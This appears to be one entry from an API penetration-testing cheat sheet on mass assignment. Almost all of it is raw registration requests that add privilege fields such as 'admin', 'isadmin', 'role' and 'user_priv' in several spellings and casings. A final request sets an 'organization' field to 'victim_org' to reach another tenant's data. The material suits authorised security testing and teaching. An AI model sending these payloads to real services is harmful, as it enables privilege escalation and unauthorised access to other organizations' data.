# 25. Mass Assignment

Test this vulnerability against the following flows:

```
- Account creation (registration)
- Unauthorized access to other organizations
- Password recovery / reset
- Login
- Email change
- Username change
```

## Initial account-creation request

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"password":"Password1!"
}
```

## Attempt 1 — `admin: true`

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"admin": true,
"password":"Password1!"
}
```

## Attempt 2 — `ADMIN: true`

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"ADMIN": true,
"password":"Password1!"
}
```

## Attempt 3 — `isadmin: true`

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"isadmin": true,
"password":"Password1!"
}
```

## Attempt 4 — `ISADMIN: true`

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"ISADMIN": true,
"password":"Password1!"
}
```

## Attempt 5 — `Admin: true`

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"Admin": true,
"password":"Password1!"
}
```

## Attempt 6 — `role: admin`

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"role": admin,
"password":"Password1!"
}
```

## Attempt 7 — `role: ADMIN`

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"role": ADMIN,
"password":"Password1!"
}
```

## Attempt 8 — `role: administrator`

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"role": administrator,
"password":"Password1!"
}
```

## Attempt 9 — `user_priv: administrator`

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"user_priv": administrator,
"password":"Password1!"
}
```

## Attempt 10 — `user_priv: admin`

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"user_priv": admin,
"password":"Password1!"
}
```

## Attempt 11 — `admin: 1`

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"admin": 1,
"password":"Password1!"
}
```

## Unauthorized access to other organizations

```
POST /api/v1/register
--snip--
{
"username":"hAPI_hacker",
"email":"hapi@hacker.com",
"organization": "victim_org",
"password":"Password1!"
}
```

Vary the field name across `org`, `org_id`, `organization`, `tenant`, `tenant_id`, `company_id`, etc. The same trick applies to `team_id`, `workspace_id`, `project_id` for SaaS products.
